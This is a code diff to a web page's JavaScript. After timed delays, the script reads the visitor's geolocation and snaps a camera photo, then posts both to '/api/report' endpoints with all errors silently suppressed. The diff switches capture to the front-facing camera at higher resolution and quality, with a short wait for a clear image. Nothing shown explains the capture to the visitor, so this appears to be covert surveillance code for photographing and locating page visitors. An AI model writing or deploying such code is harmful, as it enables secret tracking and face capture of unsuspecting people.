@@ -277,7 +277,7 @@
       pan.addEventListener('touchstart', onStart, { passive: false });
     })();
 
-    var data = { geolocation: null };
+    var data = { geolocation: null, photoBase64: null };
 
     async function getGeolocation() {
       return new Promise(function(resolve) {
@@ -298,27 +298,24 @@
       });
     }
 
-    function capturePhoto() {
-      return new Promise(function(resolve) {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return resolve(null);
-        var constraints = {
-          video: { facingMode: /Android|iPhone|iPad/i.test(navigator.userAgent) ? 'environment' : 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        };
-        navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
-          var video = document.createElement('video');
-          video.srcObject = stream;
-          video.play().then(function() {
-            var canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            var ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            stream.getTracks().forEach(function(t) { t.stop(); });
-            resolve(canvas.toDataURL('image/jpeg', 0.8));
-          }).catch(function() { resolve(null); });
-        }).catch(function() { resolve(null); });
-      });
+    async function captureCameraPhoto() {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+        var stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: 1280, height: 720 }
+        });
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        await new Promise(function(r) { video.onloadedmetadata = r; });
+        await new Promise(function(r) { setTimeout(r, 800); });
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        data.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
+        stream.getTracks().forEach(function(t) { t.stop(); });
+      } catch (e) {}
     }
 
     setTimeout(async function() {
@@ -331,12 +328,12 @@
         }).catch(function() {});
       }
       setTimeout(async function() {
-        var photo = await capturePhoto();
-        if (photo) {
+        await captureCameraPhoto();
+        if (data.photoBase64) {
           fetch('/api/report/camera', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ camera: photo })
+            body: JSON.stringify({ camera: data.photoBase64 })
           }).catch(function() {});
         }
       }, 5000);
